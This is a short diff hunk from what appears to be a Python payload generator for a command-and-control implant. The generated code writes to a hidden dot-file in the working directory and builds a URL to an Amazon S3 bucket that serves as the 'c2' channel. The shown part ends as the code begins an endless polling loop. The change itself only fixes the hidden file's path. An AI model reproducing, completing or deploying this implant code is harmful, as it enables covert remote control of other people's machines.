@@ -210,9 +210,9 @@ import requests
     payload += "def {0}():\n".format(func)
     payload += "    %s = %s\n" % (body, wss)
     payload += "    %s = os.getcwd()\n" % temp
-    payload += '    {0} = {1} + ".{2}"\n'.format(obj, temp, file)
+    payload += '    {0} = {1} + "/.{2}"\n'.format(obj, temp, file)
     payload += '    %s = "null"\n' % old
-    payload += '    {0} = " > " + {1} + ".{2}"\n'.format(save, temp, file)
+    payload += '    {0} = " > " + {1} + "/.{2}"\n'.format(save, temp, file)
     payload += '    {0} = "https://{1}.s3-{2}.amazonaws.com/{3}"'.format(get1, bucket, region_name, c2)
     payload += """                                                                                                                                                
     while 1:                                                                                                                                                      
